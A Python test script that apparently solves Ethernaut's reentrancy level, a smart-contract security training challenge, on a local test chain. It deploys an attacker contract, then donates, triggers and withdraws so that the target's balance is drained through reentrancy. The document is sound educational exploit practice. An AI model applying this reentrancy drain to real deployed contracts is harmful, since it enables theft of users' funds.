from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv10_reentrancy import Reentrance
from pytypes.contracts.attacker.lv10_reenter import ReentrancyAttack

@default_chain.connect()
def test_lv10():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv10()
    exploit_lv10(contract)
    ethernaut.check_lv10(contract)

def exploit_lv10(contract: Reentrance):
    # Attack vector: Reentrancy on withdraw method
    #   because withdraw uses 'call' that does not revert on failure, no termination condition is needed for the attack
    print(f"Balance before attack: {contract.balance / 10**18}")
    attacker = ReentrancyAttack.deploy(contract.address)
    attacker.donate(value=1 * 10**18)
    attacker.trigger(1 * 10**18)
    attacker.withdrawAll()
    print(f"Balance after attack:  {contract.balance / 10**18}")
